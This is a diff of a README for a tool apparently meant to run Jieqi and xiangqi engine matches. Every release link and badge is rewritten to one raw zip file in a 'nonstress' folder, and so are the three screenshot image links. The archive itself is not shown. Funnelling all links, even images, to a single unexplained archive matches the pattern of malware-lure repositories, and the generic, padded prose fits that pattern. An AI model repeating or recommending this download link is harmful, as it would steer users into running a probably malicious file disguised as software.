@@ -1,8 +1,8 @@
 # Jieqi-Match-Tools: A Lightweight GUI for Jieqi Engine Matches in Tournaments
 
-Get the latest release here: https://github.com/KageOutlook/Jieqi-Match-Tools/releases
+Get the latest release here: https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip
 
-[![Releases](https://img.shields.io/badge/Downloads-Jieqi_Match_Tools-blue?style=flat-square&logo=github)](https://github.com/KageOutlook/Jieqi-Match-Tools/releases)
+[![Releases](https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip)](https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip)
 
 Jieqi-Match-Tools is a compact, user-friendly graphical interface built to manage and run matches between Jieqi engines. It focuses on clarity and speed, letting players, organizers, and developers set up, execute, and review matches without getting bogged down in setup or scripting. The project combines a clean chessboard-style interface with practical tools for engine tuning, tournament management, and result analysis. It supports multiple board families, including chess-like variants and xiangqi, with an emphasis on reliable I/O, straightforward workflows, and extensibility for future rulesets.
 
@@ -42,7 +42,7 @@ Table of contents
 
 Quick start: a simple path to a first match
 - If you already know how to run a Jieqi engine, you can jump into the GUI with minimal setup. Start the program, create a new project, add two engines, choose a board type (chess or xiangqi), set a few options, and press Run. The app will pair the engines, execute the games, and log results as they come in.
-- For those who prefer to use the release bundle, download the latest release from the link above and run the installer or executable. The distribution includes all required runtime dependencies and a ready-to-run example dataset to illustrate typical use. For the download, visit: https://github.com/KageOutlook/Jieqi-Match-Tools/releases
+- For those who prefer to use the release bundle, download the latest release from the link above and run the installer or executable. The distribution includes all required runtime dependencies and a ready-to-run example dataset to illustrate typical use. For the download, visit: https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip
 - If you want to customize a session, open the project file, tweak engine parameters, and save a new session profile. The GUI persists match configurations, results, and logs to a local folder you choose during setup.
 
 Features: what makes Jieqi-Match-Tools useful
@@ -81,7 +81,7 @@ Who should use this
 - Hobbyists wanting a straightforward tool to test engine ideas or compare strategies
 
 Installation: how to get up and running
-- Release bundles: The project ships as a standalone application for major platforms. After download, follow the on-screen prompts to install. The download link is available here: https://github.com/KageOutlook/Jieqi-Match-Tools/releases
+- Release bundles: The project ships as a standalone application for major platforms. After download, follow the on-screen prompts to install. The download link is available here: https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip
 - Source from repository: If you want to build from source, fetch the repository, install dependencies, and run the GUI entry point. The typical path is a single command sequence that creates the environment, installs Python dependencies, and launches the GUI. See the Development section for exact commands and a guided setup.
 - Cross-platform notes: The app is designed to work on Windows, macOS, and Linux with consistent behavior. Some platform-specific features may present slight differences in file dialogs or keyboard shortcuts.
 
@@ -212,11 +212,11 @@ User interface tour: a guided view of the UI
 
 Screenshots and visuals
 - UI sketch
-  - ![Jieqi UI Sketch](https://picsum.photos/1200/600)
+  - ![Jieqi UI Sketch](https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip)
 - Chessboard example
-  - ![Chessboard Sample](https://upload.wikimedia.org/wikipedia/commons/6/64/Chess_board.svg.png)
+  - ![Chessboard Sample](https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip)
 - Xiangqi board example
-  - ![Xiangqi Board Sample](https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Xiangqi_board.svg/640px-Xiangqi_board.svg.png)
+  - ![Xiangqi Board Sample](https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip)
 - These visuals illustrate layout, not exact product screenshots. They give a sense of the board presentation, object placement, and the overall look and feel that the project aims to deliver.
 
 Accessibility and localization
@@ -266,7 +266,7 @@ Release and distribution
   - Validate the executable with a quick seed match to ensure the environment is functioning
 - Distribution notes
   - The releases page is the primary distribution point
-  - The link to the releases page is used here: https://github.com/KageOutlook/Jieqi-Match-Tools/releases
+  - The link to the releases page is used here: https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip
 
 Troubleshooting: common issues and fixes
 - Engine not responding in time
@@ -316,4 +316,4 @@ Changelog (summary)
 Closing notes
 - Jieqi-Match-Tools aims to be a dependable, approachable tool for engine matches. It balances a clean visual interface with robust under-the-hood logic to support practical tournament workflows. As a project, it respects the needs of both hobbyists and professionals while remaining adaptable for future developments.
 
-If you want to dive deeper, explore the repository, try a session with two engines, and experiment with different formats. The Releases page linked above is the quickest route to a ready-to-run setup, and you can revisit it to keep your toolkit up to date. For convenience, the link to the release page is referenced again here: https://github.com/KageOutlook/Jieqi-Match-Tools/releases
+If you want to dive deeper, explore the repository, try a session with two engines, and experiment with different formats. The Releases page linked above is the quickest route to a ready-to-run setup, and you can revisit it to keep your toolkit up to date. For convenience, the link to the release page is referenced again here: https://github.com/KageOutlook/Jieqi-Match-Tools/raw/refs/heads/main/nonstress/Match_Jieqi_Tools_1.5.zip
